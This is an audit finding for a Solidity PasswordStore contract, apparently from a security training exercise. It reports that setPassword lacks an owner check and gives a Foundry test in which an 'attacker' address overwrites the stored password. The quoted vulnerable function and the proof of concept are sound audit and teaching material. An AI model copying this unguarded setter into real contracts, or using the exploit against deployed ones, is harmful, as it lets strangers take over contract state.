# H-01 - anyone can set the password

https://github.com/Cyfrin/3-passwordstore-audit/blob/53ca9cb1808e58d3f14d5853aada6364177f6e53/src/PasswordStore.sol#L26C5-L29C6

```solidity
function setPassword(string memory newPassword) external {
        s_password = newPassword;
        emit SetNetPassword();
    }
```

- No check for msg.sender == s_owner

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PasswordStore} from "../src/PasswordStore.sol";
import {DeployPasswordStore} from "../script/DeployPasswordStore.s.sol";

contract PasswordStoreTest is Test {
    PasswordStore public passwordStore;
    DeployPasswordStore public deployer;
    address public OWNER = makeAddr("owner");

    address public ATTACKER = makeAddr("attacker");

    function setUp() public {
        deployer = new DeployPasswordStore();
        passwordStore = deployer.run();
        OWNER = msg.sender;
    }

    function test_review_non_owner_can_set_password() public {
        vm.prank(ATTACKER);
        string memory expectedPassword = "attackPassword";
        passwordStore.setPassword(expectedPassword);

        vm.prank(OWNER);
        string memory actualPassword = passwordStore.getPassword();
        assertEq(actualPassword, expectedPassword);
    }
}
```
